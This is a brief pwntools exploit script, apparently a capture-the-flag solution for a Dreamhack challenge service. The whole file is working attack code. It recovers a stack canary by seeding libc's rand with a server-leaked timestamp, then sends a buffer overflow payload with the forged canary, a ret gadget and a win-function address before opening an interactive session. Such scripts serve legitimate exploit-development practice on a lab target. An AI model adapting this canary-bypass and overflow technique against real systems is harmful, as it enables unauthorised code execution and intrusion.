from pwn import *
from ctypes import CDLL

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 10463
r = remote(HOST, PORT)

win=0x401291
libc = CDLL(None)

r.recvuntil(b'time: ')
t = int(r.recvline().strip())

libc.srand(t)

canary = 0
for i in range(8):
    v1 = canary << 8
    canary = v1 | (libc.rand() & 0xff)

ret=0x40101a
r.sendafter(b': ', b'A'*16+p64(canary)+b'A'*16+p64(ret)+p64(win))

r.interactive()